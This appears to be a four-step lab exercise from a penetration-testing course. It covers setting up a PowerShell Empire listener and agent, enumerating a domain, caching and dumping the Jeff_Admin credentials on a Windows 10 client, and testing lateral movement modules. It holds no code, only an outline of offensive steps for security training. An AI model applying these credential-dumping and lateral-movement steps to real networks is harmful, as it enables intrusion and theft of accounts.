1. Set up a PowerShell Empire listener and stager and obtain a working agent.
 
2. Perform enumeration on the domain using various modules.
 
3. Perform a remote desktop login with the account Jeff_Admin to ensure the credentials are cached on the Windows 10 client and then dump the credentials using PowerShell Empire.

4. Experiment with the different lateral movement modules.